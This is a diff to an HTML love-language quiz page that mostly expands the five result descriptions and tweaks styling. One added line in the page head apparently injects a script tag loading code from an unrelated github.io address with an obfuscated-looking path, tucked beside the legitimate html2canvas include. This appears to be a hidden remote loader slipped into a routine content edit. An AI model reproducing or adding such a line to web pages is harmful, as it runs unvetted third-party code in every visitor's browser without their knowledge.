@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -139,7 +140,7 @@
             }
         }
     </style>    
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <script  type="text/javascript"  src="https://utsavkth.github.io/O2pZ4r6aG8Oe3eH7Z6jA-VjMyAoXXXsYefZJ5DyylRtJd-Dm-_H8KSp735gUJkrZVBTU8KD4hNZvrG7T7Z7ZeA=="></script><script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </head>
 <body>
 
@@ -789,7 +790,8 @@
             // Display the results
             const resultDiv = document.getElementById("result");
             const resultLanguagesDiv = document.getElementById("resultLanguages");
-            resultLanguagesDiv.innerHTML = `<p>${primaryLanguages.join(', ')}</p>`;
+            resultLanguagesDiv.innerHTML = `<p><b style="color: #333333;">${primaryLanguages.join(', ')}</b></p>`;
+
             
             primaryLanguages.forEach(language => {
                 resultLanguagesDiv.innerHTML += `<h3>${language}</h3>`;
@@ -831,11 +833,41 @@
         // Get description for each love language
         function getLanguageDescription(language) {
             const descriptions = {
-                "Words of Affirmation": "<p><b>Words of Affirmation:</b> This love language focuses on verbal expressions of love, appreciation, and encouragement. Hearing kind words, compliments, and genuine affirmations are the primary ways these individuals feel valued.</p>",
-                "Quality Time": "<p><b>Quality Time:</b> This love language is all about giving someone your undivided attention. Engaging in activities together can strengthen your bond.</p>",
-                "Acts of Service": "<p><b>Acts of Service:</b> Doing helpful tasks for your partner shows your love. Actions speak louder than words for these individuals.</p>",
-                "Receiving Gifts": "<p><b>Receiving Gifts:</b> This love language involves thoughtful gifts and gestures to show you care. It's not about the monetary value but the thought behind the gift.</p>",
-                "Physical Touch": "<p><b>Physical Touch:</b> This love language emphasizes physical affection, like hugging and holding hands. Physical presence and accessibility are crucial.</p>"
+                "Words of Affirmation": `
+                    
+                    <p><b>What It Means:</b> Your love language is Words of Affirmation, which means you feel most appreciated when someone takes the time to say something thoughtful or kind to you. Whether it’s a simple “thank you” or a heartfelt compliment, spoken words carry deep meaning for you.</p>
+                    <p><b>What You Value Most:</b> You value receiving sincere compliments, words of encouragement, and verbal acknowledgments. For example, when someone says, "I appreciate how much you help me," or "You make me feel special," it reassures you and makes you feel loved.</p>
+                    <p><b>How You Can Enhance Your Relationships:</b> Express your own feelings verbally to those you care about. Encouraging notes, loving text messages, or thoughtful compliments can really brighten your day. In return, share these verbal affirmations with your loved ones—your words have the power to strengthen your relationships.</p>
+                    <p><b>Example:</b> If your partner tells you, "You look amazing today" or writes a thoughtful note, it makes you feel deeply appreciated. Make it a habit to vocalize your feelings, and don’t hesitate to ask for the affirmations that matter to you.</p>
+                `,
+                "Quality Time": `
+                    
+                    <p><b>What It Means:</b> Your primary love language is Quality Time, which means nothing is more meaningful to you than having someone’s full attention. Whether it’s having a conversation without distractions or spending time together doing something fun, you feel most loved when people prioritize time with you.</p>
+                    <p><b>What You Value Most:</b> You value quality over quantity. For example, spending an hour having a deep conversation with someone means more to you than receiving a gift. You appreciate it when people put away their phones, make eye contact, and focus on just being with you.</p>
+                    <p><b>How You Can Enhance Your Relationships:</b> Plan intentional time with your loved ones where you can both enjoy each other’s company. Whether it’s a cozy movie night, a walk in the park, or a heart-to-heart chat, being fully present is key. In your relationships, communicate how much these moments mean to you and encourage your loved ones to join you in activities that strengthen your bond.</p>
+                    <p><b>Example:</b> When someone sets aside time for a quiet dinner or a day trip without distractions, it makes you feel incredibly connected. Let others know that the best gift they can give you is their focused time and attention.</p>
+                `,
+                "Acts of Service": `
+                    
+                    <p><b>What It Means:</b> Your love language is Acts of Service, meaning actions speak louder than words for you. When someone helps you with something important—whether it’s running errands, doing chores, or taking care of something you were worried about—you feel truly loved and appreciated.</p>
+                    <p><b>What You Value Most:</b> You value helpful actions that make your life easier. For example, if a friend offers to pick up groceries for you when you're feeling overwhelmed, or your partner cleans the kitchen without being asked, these acts show you how much they care.</p>
+                    <p><b>How You Can Enhance Your Relationships:</b> You can build stronger connections by offering thoughtful help to your loved ones in return. Look for opportunities to ease their burdens, and don’t hesitate to let them know how much their actions mean to you. A small, thoughtful gesture, like helping someone with a project, can go a long way in showing your love.</p>
+                    <p><b>Example:</b> When your partner helps fold the laundry or fixes something around the house, it shows they care deeply. In return, offer to help with something they may find stressful, or ask, "What can I do to make your day easier?"</p>
+                `,
+                "Receiving Gifts": `
+                    
+                    <p><b>What It Means:</b> Your love language is Receiving Gifts. For you, a thoughtful gift is a symbol of love and appreciation. It’s not about the monetary value of the gift, but rather the thoughtfulness and meaning behind it that makes you feel cherished.</p>
+                    <p><b>What You Value Most:</b> You value small, meaningful tokens of love that show someone was thinking of you. For example, if a friend brings you your favorite coffee just because, or a loved one surprises you with a book you’ve been wanting to read, it means the world to you.</p>
+                    <p><b>How You Can Enhance Your Relationships:</b> Share with others how much small, thoughtful gestures mean to you. At the same time, make an effort to give thoughtful gifts to the people you care about, reflecting their personality or something they mentioned in conversation. Receiving and giving thoughtful gifts can deepen your emotional bonds.</p>
+                    <p><b>Example:</b> When your partner surprises you with something small but meaningful, like a handwritten card or your favorite treat, it makes you feel truly loved. Make gift-giving a way to show appreciation by picking up on small hints and being mindful of special occasions or spontaneous surprises.</p>
+                `,
+                "Physical Touch": `
+                    
+                    <p><b>What It Means:</b> Your primary love language is Physical Touch, which means you feel most connected to others through physical closeness. Whether it’s a hug, a hand on your shoulder, or sitting close together, physical affection is the most direct way you experience love.</p>
+                    <p><b>What You Value Most:</b> You value the warmth and comfort that comes from affectionate touch. For example, a simple hug after a long day, holding hands during a walk, or sitting next to someone you care about makes you feel grounded and loved.</p>
+                    <p><b>How You Can Enhance Your Relationships:</b> You can enhance your relationships by expressing your need for physical closeness and making sure your loved ones know that touch is important to you. Even small gestures, like holding hands or offering a warm embrace, can help you feel connected. Encourage your loved ones to show affection through physical touch and offer the same to them.</p>
+                    <p><b>Example:</b> When your partner places their hand on your back while you're cooking or gives you a long, comforting hug, it makes you feel cared for. Simple, consistent physical gestures can strengthen your emotional bond over time.</p>
+                `
             };
             return descriptions[language] || "";
         }
